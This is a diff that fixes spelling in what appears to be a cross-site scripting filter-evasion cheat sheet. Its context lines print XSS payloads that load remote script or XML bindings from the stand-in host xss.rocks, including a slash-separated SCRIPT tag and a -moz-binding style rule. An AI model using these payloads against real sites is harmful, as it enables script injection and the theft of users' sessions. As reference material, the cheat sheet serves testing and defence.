@@ -152,7 +152,7 @@ This is useful if the pattern match doesn't take into account spaces in the word
 
 ### Non-alpha-non-digit XSS
 
-The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:
+The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:
 
 `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`
 
@@ -403,7 +403,7 @@ This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According 
 
 ### Remote style sheet part 4
 
-This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:
+This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites:
 
 `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`
 
@@ -589,7 +589,7 @@ This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) -
 
 ### Locally hosted XML with embedded JavaScript that is generated using an XML data island
 
-This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:
+This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:
 
 ```
 <XML SRC="xsstest.xml" ID=I></XML>  
